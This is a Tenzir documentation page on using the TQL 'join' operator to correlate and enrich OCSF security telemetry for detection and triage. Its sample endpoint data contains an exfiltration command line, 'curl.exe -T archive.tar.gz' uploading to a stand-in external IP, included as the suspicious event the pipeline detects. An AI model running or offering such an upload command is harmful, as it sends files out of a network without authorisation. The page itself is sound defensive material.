---
title: "Join event streams"
description: "Correlate and enrich OCSF telemetry with relational joins inside a single pipeline."
canonical: https://tenzir.com/docs/guides/enrich/join-event-streams
source: https://tenzir.com/docs/guides/enrich/join-event-streams.md
section: "Docs"
---

# Join event streams

> Correlate and enrich OCSF telemetry with relational joins inside a single pipeline.

Security telemetry rarely tells the whole story in one stream. Network sensors see byte volumes and external destinations without knowing which process opened the socket. Endpoint agents see processes and users without cloud account ownership or vulnerability posture. Vulnerability scanners list affected packages without showing which hosts are actively under attack.

The [`join`](../../reference/operators/join.md) operator brings relational hash joins directly into a TQL pipeline. Depending on the options you pass, it joins incoming left-hand events against a finite snapshot, a periodically refreshed snapshot (`refresh`), or a second live event stream bounded by a time window (`before`, `after`, or `within`).

## Choose between `join` and lookup tables

Tenzir offers two ways to combine events with reference data:

| Capability          | [`join`](../../reference/operators/join.md) | [Lookup tables](use-lookup-tables.md) ([`context_enrich`](../../reference/operators/context_enrich.md)) |
| ------------------- | ------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Scope               | Self-contained inside one pipeline                            | Shared across pipelines in a deployment                                                                                                                         |
| Cardinality         | 1:1, 1:N, N:M, and `pick` (`latest`/`earliest`/`nearest`)     | 1:1 key-to-value lookup                                                                                                                                         |
| Filtering modes     | `inner`, `left`, `semi`, and `anti`                           | Enrichment only (keeps every input event)                                                                                                                       |
| Composite keys      | Comma-separated expressions (`a, b == c`)                     | Single key expression                                                                                                                                           |
| Reference lifecycle | Finite snapshot, periodic `refresh`, or windowed live stream  | Persistent, updated live with [`context_update`](../../reference/operators/context_update.md)                                                 |

Use [`join`](../../reference/operators/join.md) for finite reference datasets, periodically reloaded snapshots, or time-bounded stream-to-stream correlation inside one pipeline. Use [lookup tables](use-lookup-tables.md) when multiple pipelines must share a continuously updated enrichment table.

## Correlate OCSF network and endpoint telemetry with Community ID

A classic SecOps blind spot sits between the network and the host. Network sensors such as Zeek or Suricata emit OCSF [Network Activity](https://schema.ocsf.io/classes/network_activity) (`class_uid: 4001`) with byte counts and flow metadata, while endpoint sensors such as Sysmon or EDR agents emit host-side Network Activity with the originating `device` and `actor.process`. Neither stream alone answers who sent 48 MB to an unknown external IP.

The [`community_id`](../../reference/functions/community_id.md) function computes a deterministic flow hash from the connection 5-tuple so both streams meet on a shared identifier. Because [`join`](../../reference/operators/join.md) accepts asymmetric key expressions (`lhs == rhs`), you can match a precomputed `connection_info.community_uid` on the network stream against a Community ID computed inline on the endpoint stream:

```tql
// Left side: network sensor OCSF Network Activity (class_uid: 4001).
from {
  time: 2026-07-15T14:22:01Z,
  category_uid: 4,
  class_uid: 4001,
  activity_id: 6,
  type_uid: 400106,
  severity_id: 1,
  metadata: {version: "1.6.0", product: {name: "Zeek"}},
  src_endpoint: {ip: 10.0.12.45, port: 51822},
  dst_endpoint: {ip: 198.51.100.42, port: 443},
  connection_info: {
    protocol_name: "tcp",
    direction_id: 2,
    community_uid: "1:gkRFhQ3hxnudzxjxQS953W4MTpg=",
  },
  traffic: {bytes_out: 48234496, bytes_in: 12040},
}, {
  time: 2026-07-15T14:22:09Z,
  category_uid: 4,
  class_uid: 4001,
  activity_id: 6,
  type_uid: 400106,
  severity_id: 1,
  metadata: {version: "1.6.0", product: {name: "Zeek"}},
  src_endpoint: {ip: 10.0.12.99, port: 44102},
  dst_endpoint: {ip: 203.0.113.10, port: 443},
  connection_info: {
    protocol_name: "tcp",
    direction_id: 2,
    community_uid: "1:000000000000000000000000000=",
  },
  traffic: {bytes_out: 1840, bytes_in: 6120},
}
join connection_info.community_uid == community_id(
  src_ip=src_endpoint.ip,
  src_port=src_endpoint.port,
  dst_ip=dst_endpoint.ip,
  dst_port=dst_endpoint.port,
  proto=connection_info.protocol_name,
), kind="left", into=_edr {
  // Right side: endpoint sensor OCSF Network Activity (host profile).
  from {
    time: 2026-07-15T14:22:01Z,
    category_uid: 4,
    class_uid: 4001,
    activity_id: 1,
    type_uid: 400101,
    severity_id: 1,
    metadata: {version: "1.6.0", product: {name: "Sysmon"}},
    device: {hostname: "ws-fin-04.corp.example", uid: "host-4412"},
    actor: {
      process: {
        name: "curl.exe",
        pid: 7412,
        cmd_line: "curl.exe -T archive.tar.gz https://198.51.100.42/upload",
      },
      user: {name: "j.chen"},
    },
    src_endpoint: {ip: 10.0.12.45, port: 51822},
    dst_endpoint: {ip: 198.51.100.42, port: 443},
    connection_info: {protocol_name: "tcp", direction_id: 2},
  }
}
if _edr != null {
  device = _edr.device
  actor = _edr.actor
}
drop _edr
select time, src_ip=src_endpoint.ip, dst_ip=dst_endpoint.ip,
       bytes_out=traffic.bytes_out, host=device?.hostname?,
       user=actor?.user?.name?, process=actor?.process?.name?
```

```tql
{
  time: 2026-07-15T14:22:01Z,
  src_ip: 10.0.12.45,
  dst_ip: 198.51.100.42,
  bytes_out: 48234496,
  host: "ws-fin-04.corp.example",
  user: "j.chen",
  process: "curl.exe",
}
{
  time: 2026-07-15T14:22:09Z,
  src_ip: 10.0.12.99,
  dst_ip: 203.0.113.10,
  bytes_out: 1840,
  host: null,
  user: null,
  process: null,
}
```

Using `kind="left"` keeps network flows that lack an endpoint match (such as unmanaged devices or guest VLAN traffic), while `into=_edr` attaches the matched endpoint record without overwriting any network fields. Promoting `_edr.device` and `_edr.actor` leaves a standard OCSF Network Activity event carrying both wire-level volume and host-level attribution.

### Production pipeline: correlate archived network and endpoint telemetry

In practice, you pull both streams from object storage or a data lake and trim the right-hand side to the fields you actually need before building the index:

```tql
from_s3 "s3://sec-telemetry/ocsf/network/2026-07-15/*.parquet" {
  read_parquet
}
where traffic.bytes_out > 10Mi
join connection_info.community_uid == community_id(
  src_ip=src_endpoint.ip,
  src_port=src_endpoint.port,
  dst_ip=dst_endpoint.ip,
  dst_port=dst_endpoint.port,
  proto=connection_info.protocol_name,
), kind="left", into=_edr, max_memory=1Gi {
  from_s3 "s3://sec-telemetry/ocsf/edr-netconn/2026-07-15/*.parquet" {
    read_parquet
  }
  select src_endpoint, dst_endpoint, connection_info, device, actor
}
if _edr != null {
  device = _edr.device
  actor = _edr.actor
}
drop _edr
to_clickhouse table="ocsf_network_attributed",
              host="clickhouse.internal",
              password=secret("CLICKHOUSE_PASSWORD")
```

Filtering the left stream down to transfers above 10 MiB and projecting the endpoint Parquet files down to five columns keeps memory usage predictable while producing analyst-ready attributed flows in ClickHouse.

## Enrich multi-tenant OCSF authentication with composite keys

User identifiers frequently collide across cloud accounts, subsidiaries, or tenants. Joining on `user.uid` alone risks attributing a service account in a sandbox account to a finance administrator in production.

Pass comma-separated keys to match on multiple fields at once. Every component must match, and any event where a key component is `null` or missing never matches, preventing accidental cross-joins on anonymous or unauthenticated events:

```tql
from {
  time: 2026-07-15T15:04:12Z,
  category_uid: 3,
  class_uid: 3002,
  activity_id: 1,
  type_uid: 300201,
  cloud: {account: {uid: "111122223333"}},
  user: {uid: "u-1042", name: "m.patel"},
  status: "Success",
}, {
  time: 2026-07-15T15:05:01Z,
  category_uid: 3,
  class_uid: 3002,
  activity_id: 1,
  type_uid: 300201,
  cloud: {account: {uid: "999988887777"}},
  user: {uid: "u-1042", name: "svc-deploy"},
  status: "Success",
}, {
  time: 2026-07-15T15:06:30Z,
  category_uid: 3,
  class_uid: 3002,
  activity_id: 1,
  type_uid: 300201,
  cloud: {account: {uid: "111122223333"}},
  user: {uid: null, name: "anonymous"},
  status: "Failure",
}
join cloud.account.uid == account_id, user.uid == employee_id,
     kind="left", into=_hr {
  from {account_id: "111122223333", employee_id: "u-1042", department: "Finance", privileged: true},
       {account_id: "111122223333", employee_id: null, department: "Unassigned", privileged: false}
}
if _hr != null {
  user.org = {name: _hr.department}
  user.type = "Admin" if _hr.privileged else "User"
}
drop _hr
select account=cloud.account.uid, user=user.name,
       department=user.org?.name?, user_type=user.type?
```

```tql
{
  account: "111122223333",
  user: "m.patel",
  department: "Finance",
  user_type: "Admin",
}
{
  account: "999988887777",
  user: "svc-deploy",
  department: null,
  user_type: null,
}
{
  account: "111122223333",
  user: "anonymous",
  department: null,
  user_type: null,
}
```

Even though `svc-deploy` shares `u-1042` and `anonymous` shares the account ID with a `null` employee row, only `m.patel` in account `111122223333` receives the `Finance` and `Admin` attributes.

## Scope detections and suppress allowlists with semi and anti joins

Many security pipelines need membership filtering rather than field attachment. Use `kind="semi"` and `kind="anti"` when you want to keep or drop events based on another dataset without modifying the events or retaining right-side payloads in memory.

### Keep only findings on critical vulnerable assets

Suppose a vulnerability export lists every open critical CVE per asset, so one host can appear many times. A `semi` join emits each matching OCSF [Detection Finding](https://schema.ocsf.io/classes/detection_finding) (`class_uid: 2004`) at most once, regardless of how many matching CVE rows exist on the right:

```tql
from {
  class_uid: 2004,
  finding_info: {title: "Suspicious PowerShell download"},
  device: {uid: "asset-01", hostname: "prod-db-01"},
}, {
  class_uid: 2004,
  finding_info: {title: "Suspicious PowerShell download"},
  device: {uid: "asset-99", hostname: "dev-box-14"},
}
join device.uid == asset_uid, kind="semi" {
  from {asset_uid: "asset-01", cve: "CVE-2026-1001", tier: "crown-jewel"},
       {asset_uid: "asset-01", cve: "CVE-2026-2044", tier: "crown-jewel"}
}
```

```tql
{
  class_uid: 2004,
  finding_info: {
    title: "Suspicious PowerShell download",
  },
  device: {
    uid: "asset-01",
    hostname: "prod-db-01",
  },
}
```

### Suppress authorized scanners with an anti join

An `anti` join does the inverse: it forwards only left events that have no match on the right, making it a concise way to suppress authorized scanners, penetration test ranges, or maintenance accounts:

```tql
from {
  class_uid: 4001,
  src_endpoint: {ip: 10.20.0.5},
  dst_endpoint: {ip: 10.0.12.45, port: 22},
}, {
  class_uid: 4001,
  src_endpoint: {ip: 198.51.100.77},
  dst_endpoint: {ip: 10.0.12.45, port: 22},
}
join src_endpoint.ip == scanner_ip, kind="anti" {
  from {scanner_ip: 10.20.0.5, owner: "secops-vuln-scanner"}
}
```

```tql
{
  class_uid: 4001,
  src_endpoint: {
    ip: 198.51.100.77,
  },
  dst_endpoint: {
    ip: 10.0.12.45,
    port: 22,
  },
}
```

Because `semi` and `anti` joins store only distinct right-hand keys and discard all non-key columns, they stay memory-efficient even when the right-hand file carries wide metadata fields.

## Expand one-to-many vulnerability mappings

Unlike lookup tables, which store one value per key, [`join`](../../reference/operators/join.md) supports full one-to-many and many-to-many relational expansion. This lets you join software inventory records against an advisory catalog where a single package version maps to several CVEs, emitting one candidate finding per `(host, CVE)` pair:

```tql
from {
  device: {hostname: "web-01.prod.example", uid: "asset-01"},
  package: {name: "openssl", version: "3.0.11"},
}, {
  device: {hostname: "db-01.prod.example", uid: "asset-02"},
  package: {name: "zlib", version: "1.3.1"},
}
join package.name == pkg, package.version == ver, into=vulnerability {
  from {pkg: "openssl", ver: "3.0.11", cve: "CVE-2024-0727", severity: "Medium"},
       {pkg: "openssl", ver: "3.0.11", cve: "CVE-2024-2511", severity: "High"}
}
select host=device.hostname, pkg=package.name,
       cve=vulnerability.cve, severity=vulnerability.severity
```

```tql
{
  host: "web-01.prod.example",
  pkg: "openssl",
  cve: "CVE-2024-0727",
  severity: "Medium",
}
{
  host: "web-01.prod.example",
  pkg: "openssl",
  cve: "CVE-2024-2511",
  severity: "High",
}
```

Omit `into=` when you want the two sides kept completely separate under `{left: ..., right: ...}` so no field names can ever overlap.

## Correlate live streams in time windows

Many security questions depend on *when* two events occurred, not just whether they share a key. An internal IP address may move between three laptops in one day, and a DNS lookup only explains an outbound connection that happened shortly afterward.

Passing `before`, `after`, or `within` switches [`join`](../../reference/operators/join.md) into streaming windowed mode, where both inputs stay live and a right-hand event matches a left-hand event whenever `L.time - before <= R.time <= L.time + after` (inclusive). Add `on` to evaluate windows on event timestamps rather than arrival time, `tolerance` to absorb out-of-order delivery, and `idle_timeout` to finalize open windows if one stream goes quiet.

The following diagram follows one network flow at 10:30 against a live stream of DHCP leases. Blue marks the matching window, green marks the leases that `join` emits, and the red dashed line marks the watermark of the right stream, which decides when a window is final.

Three timeline panels explain streaming windowed join. In the first panel, a network flow on the left input at 10 opens a window on the DHCP lease stream from 09 to 10, set by before=1h and after=15m; within=1h would set both bounds to one hour. Both bounds are inclusive, so leases at 09, 10, and 10 fall inside the window, while leases at 09 and 11 fall outside. In the second panel, pick all emits all three leases, pick earliest emits the 09 lease, and pick latest emits the 10 lease. Pick nearest emits the 10 lease: the 10 and 10 leases both lie 15 minutes from the flow, and the past lease wins the tie. A highlighted backward as-of row with before=1h and pick latest ends the window at the flow, which leaves the 10 lease outside, and emits the 10 lease of ws-fin-04, the latest lease before the flow. In the third panel, the same window sits on the lease stream, whose latest lease at 11 sets max\_ts. With a tolerance of 10 minutes, the watermark of the right stream is 10. Because the watermark has passed the window end at 10, the window is final and join emits the pick winner, the unmatched left row, or the anti row.

### Attribute dynamic IPs with a backward as-of join

Corporate DHCP servers reassign internal IP addresses constantly. To attach the right hostname and MAC address to each OCSF Network Activity flow (`class_uid: 4001`), join against OCSF [DHCP Activity](https://schema.ocsf.io/classes/dhcp_activity) (`class_uid: 4004`) using `before=1h` and `pick="latest"`. Each flow receives the most recent lease issued up to one hour before the flow, ignoring older leases and future reassignments:

```tql
from {
  time: 2026-07-15T10:30:00Z,
  class_uid: 4001,
  src_endpoint: {ip: 10.0.12.45},
  dst_endpoint: {ip: 198.51.100.42, port: 443},
  traffic: {bytes_out: 48234496},
}, {
  time: 2026-07-15T12:10:00Z,
  class_uid: 4001,
  src_endpoint: {ip: 10.0.12.45},
  dst_endpoint: {ip: 203.0.113.10, port: 80},
  traffic: {bytes_out: 1840},
}
join src_endpoint.ip == dst_endpoint.ip,
     kind="left", before=1h, on=time, pick="latest", into=_lease {
  from {
    time: 2026-07-15T09:40:00Z,
    class_uid: 4004,
    dst_endpoint: {ip: 10.0.12.45, hostname: "ws-old.corp.example", mac: "aa:bb:cc:00:00:01"},
  }, {
    time: 2026-07-15T10:15:00Z,
    class_uid: 4004,
    dst_endpoint: {ip: 10.0.12.45, hostname: "ws-fin-04.corp.example", mac: "aa:bb:cc:00:00:02"},
  }, {
    time: 2026-07-15T10:45:00Z,
    class_uid: 4004,
    dst_endpoint: {ip: 10.0.12.45, hostname: "ws-next.corp.example", mac: "aa:bb:cc:00:00:03"},
  }
}
if _lease != null {
  src_endpoint.hostname = _lease.dst_endpoint.hostname
  src_endpoint.mac = _lease.dst_endpoint.mac
}
drop _lease
select time, src_ip=src_endpoint.ip, host=src_endpoint?.hostname?,
       mac=src_endpoint?.mac?, dst_ip=dst_endpoint.ip
sort time
```

```tql
{
  time: 2026-07-15T10:30:00Z,
  src_ip: 10.0.12.45,
  host: "ws-fin-04.corp.example",
  mac: "aa:bb:cc:00:00:02",
  dst_ip: 198.51.100.42,
}
{
  time: 2026-07-15T12:10:00Z,
  src_ip: 10.0.12.45,
  host: null,
  mac: null,
  dst_ip: 203.0.113.10,
}
```

The flow at `10:30` binds to `ws-fin-04.corp.example` (leased at `10:15`), ignoring the superseded `09:40` lease and the future `10:45` lease, while the `12:10` flow falls outside the one-hour lookback and keeps `null` attribution.

### Correlate outbound connections with recent DNS queries

When timestamp fields carry different names on the two streams, map them with `on=left_time == right_time` and combine `before` with a small `after` margin for clock skew between sensors:

```tql
from {
  time: 2026-07-15T14:00:12Z,
  class_uid: 4001,
  src_endpoint: {ip: 10.0.12.45},
  dst_endpoint: {ip: 198.51.100.42, port: 443},
}, {
  time: 2026-07-15T14:15:00Z,
  class_uid: 4001,
  src_endpoint: {ip: 10.0.12.45},
  dst_endpoint: {ip: 198.51.100.42, port: 443},
}
join src_endpoint.ip == client_ip, dst_endpoint.ip == answer_ip,
     before=2m, after=10s, on=time == dns_time, tolerance=30s, into=_dns {
  from {
    dns_time: 2026-07-15T14:00:10Z,
    client_ip: 10.0.12.45,
    answer_ip: 198.51.100.42,
    domain: "exfil.bad.example",
  }
}
select time, src_ip=src_endpoint.ip, dst_ip=dst_endpoint.ip, domain=_dns.domain
```

```tql
{
  time: 2026-07-15T14:00:12Z,
  src_ip: 10.0.12.45,
  dst_ip: 198.51.100.42,
  domain: "exfil.bad.example",
}
```

In a live deployment, replace the inline `from` sources with [`subscribe`](../../reference/operators/subscribe.md) topics and set `idle_timeout` so quiet periods still finalize open windows:

```tql
subscribe "ocsf.network-activity"
join src_endpoint.ip == dst_endpoint.ip,
     kind="left", before=24h, on=time, tolerance=1m, idle_timeout=5m,
     pick="latest", into=_lease {
  subscribe "ocsf.dhcp-activity"
  select time, dst_endpoint
}
if _lease != null {
  src_endpoint.hostname = _lease.dst_endpoint.hostname
  src_endpoint.mac = _lease.dst_endpoint.mac
}
drop _lease
publish "ocsf.network-attributed"
```

## Chain joins with periodic snapshot refresh in a live SecOps triage pipeline

For slowly changing reference datasets such as CMDB tables, scanner allowlists, and vulnerability exports, add `refresh` so each stage reloads its snapshot on schedule without restarting the pipeline. During each reload, `join` builds the new index in the background, swaps it atomically on clean completion, and falls back to the previous snapshot with a warning if the upstream store is temporarily unreachable.

The pipeline below subscribes to live OCSF Detection Findings, refreshes its scanner allowlist every 5 minutes, refreshes production asset ownership from ClickHouse every 15 minutes, refreshes critical CVE exposures from S3 every hour, and forwards prioritized alerts to Splunk:

```tql
subscribe "ocsf.detection-findings"


// 1. Drop alerts generated by authorized scanners (reloaded every 5m).
join src_endpoint?.ip? == scanner_ip, kind="anti", refresh=5m {
  from_file "/etc/tenzir/allowlists/scanners.csv" {
    read_csv
  }
  scanner_ip = scanner_ip.ip()
}


// 2. Attach production asset ownership from ClickHouse (reloaded every 15m).
join device.uid == asset_uid, kind="left", refresh=15m, into=_asset {
  from_clickhouse table="cmdb_assets",
                  host="clickhouse.internal",
                  password=secret("CLICKHOUSE_PASSWORD")
  where environment == "production"
  select asset_uid, owner_team, criticality, zone
}
if _asset != null {
  device.owner = {name: _asset.owner_team}
  device.zone = _asset.zone
  metadata.labels = metadata.labels.add(f"criticality:{_asset.criticality}")
}
drop _asset


// 3. Escalate only findings on assets carrying an open critical CVE (hourly).
join device.uid == asset_uid, kind="semi", refresh=1h {
  from_s3 "s3://sec-inventory/vuln/critical-cves-latest.parquet" {
    read_parquet
  }
  where cvss >= 9.0
  select asset_uid
}


to_splunk "https://splunk.internal:8088",
          hec_token=secret("SPLUNK_HEC_TOKEN"),
          index="secops_high_priority"
```

Each stage blocks briefly on startup until its initial snapshot loads, then serves live alerts continuously while keeping reference state current in the background.

## Keep joins fast and bounded

Follow four habits to keep [`join`](../../reference/operators/join.md) predictable in production pipelines:

* **Put the smaller dataset on the right in build and snapshot modes.** Stream the high-volume telemetry on the left and load the reference snapshot on the right.
* **Size `max_memory` for your mode.** In finite build mode, `max_memory` (default `512Mi`) bounds the right-hand index. In `refresh` mode, `max_memory` covers both the active and shadow snapshots during a reload, so size it to at least twice the snapshot footprint. In streaming windowed mode, `max_memory` covers buffered events on both sides; keep `before` and `after` as narrow as your correlation window allows and set `idle_timeout` when one side can go quiet.
* **Let the optimizer push projections and filters, and still trim wide sources explicitly.** Downstream [`select`](../../reference/operators/select.md) and infallible [`where`](../../reference/operators/where.md) operators push through `join` automatically where safe (including projecting `semi` and `anti` right sources down to key columns only). For `pick` joins, right-side filters stay after `join` to preserve candidate ranking; for event-time streaming joins, filters stay after `join` on both sides so filtered events still advance watermarks, while projections still push down.
* **Align key types explicitly.** A string `"10.0.0.1"` does not match an IP address `10.0.0.1`. Convert one side in the key expression, for example `join src.ip() == host_ip { … }`. If zero events match because the two sides have incompatible key types, the operator emits a warning pointing at the mismatched expressions.

## See Also

* [Use lookup tables](use-lookup-tables.md)
* [Enrich with asset inventory](enrich-with-asset-inventory.md)
* [Enrich with threat intel](enrich-with-threat-intel.md)
* [Create multi-stage detectors](../detect/create-multi-stage-detectors.md)
* [Enrichment](../../explanations/enrichment.md)
